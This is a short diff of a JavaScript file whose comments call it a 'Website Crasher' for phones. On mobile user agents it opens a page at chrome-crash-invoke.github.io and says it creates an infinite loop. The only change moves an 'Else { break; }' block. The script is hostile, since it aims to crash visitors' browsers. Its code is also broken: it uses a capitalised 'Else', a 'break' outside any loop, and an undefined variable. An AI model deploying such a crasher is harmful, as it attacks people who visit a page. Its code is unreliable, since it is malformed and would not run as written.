@@ -14,9 +14,9 @@ if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigat
        /* (Website Crasher For IOS and android And Mostly Every Phone) */
        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
        document.open('#' + $x); // Forces A Link With No Function To Be Made.     
+    } Else {
+      break; // if Not Mobile Continue To Variable's For Computer              
     }
-} Else {
-  break; // if Not Mobile Continue To Variable's For Computer              
 }
 
 /* This Affects Most Computers Depending On Control */
